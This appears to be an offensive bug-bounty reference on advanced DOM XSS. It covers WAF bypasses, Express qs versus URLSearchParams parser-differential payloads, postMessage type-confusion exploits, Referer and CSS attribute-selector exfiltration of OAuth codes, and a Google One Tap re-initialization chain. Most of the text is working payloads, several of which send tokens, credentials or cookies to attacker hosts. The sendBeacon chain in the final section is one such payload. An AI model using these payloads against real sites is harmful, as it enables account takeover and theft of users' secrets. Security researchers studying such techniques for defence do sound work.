# Advanced DOM XSS — bypasses, type confusion, and exfil-without-JS

Source: Voorivex Team research (blog.voorivex.team), 2023–2026. Each technique was a real paid finding unless noted.

## 1. Filter and WAF bypasses

### Character-strip reassembly (GIS SDK DOM XSS → ATO)
A custom WAF blocked `javascript:` and every known obfuscation. Near the `location.href` sink sat a `replace()` stripping `/ < > ' " \` from the `rUrl` param. The strip itself rebuilds the scheme:

```
https://target.com/login?rUrl=ja.va.sc.ri.pt.:al.er.t(or.ig.in)//blahblah.com
                → after strip → javascript:alert(origin)//blahblah.com
```

Lesson: when a match-block filter and a separate replace-strip both guard a sink, they are uncoordinated — split your payload with exactly the characters the strip removes. Enumerate the strip set first with single-char probes.

### Query-string parser differentials (Express `qs` vs browser `URLSearchParams`)
The pattern: server-side middleware validates a query param; client JS re-reads it from `window.location` with `URLSearchParams`. The two parsers disagree, so the server validates one value and the browser executes another.

`qs` (Express `extended`) quirks:
- `]=` is located BEFORE the first `=` when splitting key/value: a param containing `]=` is treated as one giant key.
- Bracket keys are stripped: `[redirect_uri]=x` parses as `redirect_uri`.
- Duplicate keys merge into arrays.
- `parameterLimit: 1000` — params beyond 1000 are SILENTLY dropped.

`URLSearchParams` quirks: no brackets, no limits, `.get()` returns the FIRST occurrence, splits at first `=`.

**Payload 1 (`]=` priority)** — server's `redirect_uri` check sees only the clean second param; client `.get()` returns the first (poisoned) one:
```
/?redirect_uri=javascript:alert(origin)//?x]=x&redirect_uri=https://pwnbox.xyz/docs
```

**Payload 2 (bracket strip + parameterLimit)** — server checks the bracketed clean value; the 1001st param hides the payload:
```
/?[redirect_uri]=https://pwnbox.xyz/docs&p&p&p...(×1000)...&redirect_uri=javascript:alert(origin)
```

Applies to any "validate server-side, consume client-side" param: OAuth redirect_uri handling in SPAs, redirect params read by router middleware.

## 2. postMessage type confusion (WebIDL overload forks)

When a handler uses one value for BOTH a check and a sink, ask whether the two sites agree on its TYPE. Arrays are the universal confusion payload: through structured clone they carry named own properties, and `ToString(array)` returns the elements — one object that is simultaneously a control object and a string.

**TargetOrigin confusion.** Handler:
```js
let origin = m.data.origin;
if (ALLOWED_ORIGINS.includes(new URL(origin).hostname))
  window.parent.postMessage(SECRET, origin);
```
Exploit — array passes `new URL()` (stringifies) but matches the SECOND postMessage overload (`postMessage(message, options)`), reading `options.targetOrigin`:
```js
const origin = ["https://example.com"];
origin.targetOrigin = "https://attacker.tld";
victim.contentWindow.postMessage({origin}, "*");
```

**Dynamic dispatch.** `window[event.data.func](event.data)` guarded by `action==='log'`:
```js
const data = ["alert(origin)"];   // ToString → the code string
data.action = 'log';              // passes the guard
data.func = 'setTimeout';         // setTimeout(DOMString|Function) takes the string branch
victim.contentWindow.postMessage(data, "*");
```

**Prototype chain to Function.** `log[event.data.cat][event.data.message_type](event.data)()` with `cat = message_type = 'constructor'` → `log["constructor"]["constructor"]` = `Function` → `Function(["alert(origin)"])()`.

Dangerous overload forks to audit (from a full Blink IDL walk): `postMessage` 2nd arg (string vs options object), `setTimeout`/`setInterval` 1st arg (string vs function), `Function` (ToString), ~22 Trusted Types sinks (trusted object skips enforcement, string branch runs it), `document.open` (2-arg resets document, 3-arg returns a Window).

## 3. Exfiltration when JavaScript never executes ("sanitized ≠ inert")

For DOMPurify-guarded injections on pages whose URL carries a secret (OAuth redirect_uri callbacks: `...callback?code=SECRET&error_description=<your injection>`), stop chasing JS execution and steal the URL itself via the Referer header. Default policy `strict-origin-when-cross-origin` sends only the origin — every technique below flips the page to `unsafe-url` (full URL incl. query).

**T1 — CSS url() request modifiers (Chrome 150+; DOMPurify has no CSS parser and allowlists `style`):**
```html
<div style="background-image:url('https://attacker.example/x' referrer-policy(unsafe-url))"></div>
<style>*{background-image:url('https://attacker.example/x' referrer-policy(unsafe-url))}</style>
```

**T2 — DOMParser parse-time side effect (pre-150; works even though DOMPurify REMOVES the meta):**
```html
<meta name="referrer" content="unsafe-url"><img src="https://attacker.example/log">
```
DOMPurify sanitizes via `DOMParser.parseFromString`, whose document executes with the live page's context — during parsing, the meta element calls `ParseAndSetReferrerPolicy("unsafe-url")` on the REAL page. By removal time the policy is already flipped; the surviving `<img>` leaks the full URL.

**T3 — Link response header on an attacker-hosted image (CVE-2025-4664, patched Chrome 136):** when you control only `<img src>`, host the image yourself and answer with:
```
Link: <https://attacker.com/log>; rel="preload"; as="image"; referrerpolicy="unsafe-url"
```
Chrome uniquely resolved Link headers on subresource requests — the page then sends the full URL to `/log`.

**T4 — CSS attribute-selector exfil (paid 2× $4,850).** When a third-party script (Google Ads viewthroughconverness) reflects the page URL into its `src`, the secret becomes CSS-selectable:
```css
html:has(script[src*="token=49"]) div {
  background: url(https://attacker.com/leak?chars=49) !important;
  display: block !important;
}
```
Leak 2 chars per round with sequential `@import` chaining: your server holds `/next` open; a matching rule fires `/leak`, which releases the next `/next` containing matchers for the grown prefix (`token=494d`, `token=494daa`, …). CRITICAL: newly imported rules lose the cascade to earlier ones — each round must add one more `:is(div)` (then `:is(div):is(div)`, …) to escalate specificity, or rounds silently stop matching.

Prerequisite for T1/T2/T4: get the victim's OAuth flow to land on the injectable page — point `redirect_uri` (or its path traversal) at it so `?code=`/`?auth_token=` arrives with your CSS (see bb-oauth skill).

## 4. Chain material

- **GIS SDK re-initialization** (zero-interaction OAuth theft from an XSS on the login origin):
```js
// inside your XSS payload:
s = document.createElement('script');
s.src = 'https://accounts.google.com/gsi/client';
s.onload = () => {
  google.accounts.id.initialize({
    client_id: '<target client_id>',
    callback: r => navigator.sendBeacon('https://attacker/', r.credential + '|' + document.cookie),
    auto_select: true, itp_support: false, use_fedcm_for_prompt: false
  });
  google.accounts.id.prompt();  // One Tap auto-sign-in, no click
};
document.head.appendChild(s);
```
Alternative: hook `window.open` and append `prompt=none&authuser=0` to accounts.google.com URLs.
- **2FA-everywhere targets**: enumerate pre-login cookies/headers for a browser-recognition token (e.g. non-HttpOnly `dd` cookie). Stolen recognition cookie + fresh OAuth session = "same browser" → 2FA skipped.
- Classic "dirty dancing" (Frans Rosen) against Google OAuth often fails on GIS SDK (`gis_transform` internal redirect_uri rejects absolute URLs) — prefer the SDK re-init above.
